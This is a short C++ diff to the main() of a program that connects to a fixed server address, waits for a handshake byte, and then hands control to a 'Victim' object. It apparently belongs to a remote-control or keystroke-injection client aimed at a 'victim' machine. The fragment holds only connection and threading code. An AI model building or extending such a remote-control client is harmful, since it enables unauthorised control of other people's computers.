@@ -1,5 +1,4 @@
 #include "victim.h"
-#include <iostream>
 #include <thread>
 
 /* possible messages form server:
@@ -40,17 +39,17 @@ int main()
     char buf[1];
     bool connected = false;
 
+    std::thread stayAwake(keepConnected, std::ref(ard));
+    stayAwake.detach();
     std::thread connect(connectServer, std::ref(ard), std::ref(connected));
     do {
         ard.receive(buf, sizeof(buf), size, ip, port);
     } while (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'v');
     connected = true;
-    std::thread stayAwake(keepConnected, std::ref(ard));
     connect.join();
 
     std::cout << "started connection with server\n";
     Victim victim(&ard);
-    std::thread repeatKeys(&Victim::repeatKeys, &victim);
 
     return victim.controlVictim();
 }
